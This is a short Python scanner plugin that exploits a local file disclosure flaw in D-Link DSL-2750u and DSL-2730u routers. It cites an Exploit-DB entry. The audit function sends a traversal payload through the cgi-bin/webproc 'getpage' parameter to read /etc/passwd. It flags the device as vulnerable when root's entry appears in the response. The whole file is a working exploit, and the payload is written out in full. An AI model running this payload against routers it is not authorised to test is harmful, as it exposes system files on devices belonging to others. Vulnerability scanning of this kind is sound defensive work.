#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__author__= 'K0thony'
#Exploit Tittle: Dlink DSL-2750u and DSL-2730u - Authenticated Local File Disclosure
#Refer:https://www.exploit-db.com/exploits/37516/
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
    target = arg + payload
    
    code, head, res, body, _ = curl.curl2(target)
    if code == 200 and '/root:/bin/bash' in res:
        security_hole(arg + 'D-Link 2750u / 2730u Local File Disclosure')


if __name__ == '__main__': 
    from dummy import *
    audit(assign('www','http://www.example.com/')[1])